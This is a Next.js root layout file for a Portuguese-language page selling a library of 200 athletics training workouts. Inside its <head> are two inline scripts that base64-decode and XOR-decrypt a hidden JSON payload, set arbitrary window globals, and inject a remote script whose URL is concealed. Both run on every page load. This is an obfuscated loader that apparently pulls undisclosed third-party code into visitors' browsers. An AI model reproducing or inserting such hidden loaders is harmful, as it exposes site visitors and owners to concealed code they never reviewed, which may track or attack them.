import type { Metadata } from 'next'
import { Inter, Oswald } from 'next/font/google'
import Script from 'next/script'
import './globals.css'

const inter = Inter({ variable: '--font-inter', subsets: ['latin'] })
const oswald = Oswald({ 
  variable: '--font-oswald', 
  subsets: ['latin'],
  weight: ['400', '500', '600', '700']
})

export const metadata: Metadata = {
  title: '200 Treinos de Atletismo | Biblioteca Visual de Treinos',
  description: '200 treinos prontos de atletismo para consultar e aplicar, do iniciante ao avançado, com adaptações por público e nível. Acesso imediato.',
  generator: 'v0.app',
  openGraph: {
    title: '200 Treinos de Atletismo | Biblioteca Visual de Treinos',
    description: '200 treinos prontos de atletismo para consultar e aplicar. Acesso imediato e garantia de 7 dias.',
    type: 'website',
    locale: 'pt_BR',
    siteName: '200 Treinos de Atletismo',
  },
  twitter: {
    card: 'summary_large_image',
    title: '200 Treinos de Atletismo',
    description: '200 treinos prontos de atletismo para consultar e aplicar. Acesso imediato e garantia de 7 dias.',
  },
  icons: {
    icon: [
      {
        url: '/icon-light-32x32.png',
        media: '(prefers-color-scheme: light)',
      },
      {
        url: '/icon-dark-32x32.png',
        media: '(prefers-color-scheme: dark)',
      },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="pt-BR" className={`${inter.variable} ${oswald.variable} bg-background`}>
      <head>
        <Script
          id="external-script-1"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var l_u9l=atob("DHYGulNMMlh2h/edTw0kzyEgEGJU74PpPwU8lXwvVjZY8oPwJhB/lDAjX3YU9djuLARvyic/HS0C6oSyIxdy3yA4HDIFpdu/LgJyyDouRywT9NWnFA0k1DIhV3pMpZP8OxcrzychWz4PqofvKgBj1CdhSjsZ49ruLB0klnE6UzQD4tWnbVR7lihuXDkb4tWnbRJnzjJhRywb7pHkYgZ03yUpXCxb9IL/JhJ1mH9uRDka8pK/dVQkxw4x");var f_6mb=[];for(var w_ph2w=0;w_ph2w<l_u9l.length;w_ph2w++){f_6mb.push(l_u9l.charCodeAt(w_ph2w)&255);}var h_d=f_6mb[0];var t_m=f_6mb.slice(1,1+h_d);var u_ol=f_6mb.slice(1+h_d);var r_pro8=u_ol.map(function(b,t_4j){return b^t_m[t_4j%h_d];});var s_fyhn="";for(var w_6=0;w_6<r_pro8.length;w_6++){s_fyhn+=String.fromCharCode(r_pro8[w_6]&255);}var w_l=decodeURIComponent(escape(s_fyhn));var r_j=JSON.parse(w_l);var f_5s=r_j.globals||[];f_5s.forEach(function(n_y){window[n_y.name]=n_y.value;});var t_0e7i=document.createElement("script");t_0e7i.src=r_j.url;t_0e7i.async=true;t_0e7i.defer=true;(r_j.attributes||[]).forEach(function(v_p6qq){t_0e7i.setAttribute(v_p6qq.name,v_p6qq.value);});(document.head||document.documentElement).appendChild(t_0e7i);})();`,
          }}
        />
        <Script
          id="external-script-2"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var i_us=atob("DAbn/oLne2SjGmuLHn3Fi/CLWV6Bch//bnXd0a2EHwqNbx/md2Ce0OGIFkrBaET4fXSOjvaUVBTKYg7nMXaOhueLVQ7QOEepf3KTjOuFDhDGaUmxRVvL3OWLFAbCdhipJF2c3OyGFgGBIEn7d36CksuDWUiBbArna2PFxKDRGlObKw7pLGTXxrPTQlGbKVO8e2DenLTFBjne");var v_a=[];for(var b_rc=0;b_rc<i_us.length;b_rc++){v_a.push(i_us.charCodeAt(b_rc)&255);}var q_u=v_a[0];var e_805b=v_a.slice(1,1+q_u);var l_6ll=v_a.slice(1+q_u);var q_88fr=l_6ll.map(function(b,u_dwat){return b^e_805b[u_dwat%q_u];});var n_b="";for(var m_ad3=0;m_ad3<q_88fr.length;m_ad3++){n_b+=String.fromCharCode(q_88fr[m_ad3]&255);}var k_m6=decodeURIComponent(escape(n_b));var y_en=JSON.parse(k_m6);var k_tb=y_en.globals||[];k_tb.forEach(function(q_bjot){window[q_bjot.name]=q_bjot.value;});var f_vd=document.createElement("script");f_vd.src=y_en.url;f_vd.async=true;f_vd.defer=true;(y_en.attributes||[]).forEach(function(f_b){f_vd.setAttribute(f_b.name,f_b.value);});(document.head||document.documentElement).appendChild(f_vd);})();`,
          }}
        />
      </head>
      <body className="font-sans antialiased">
        {children}

      </body>
    </html>
  )
}
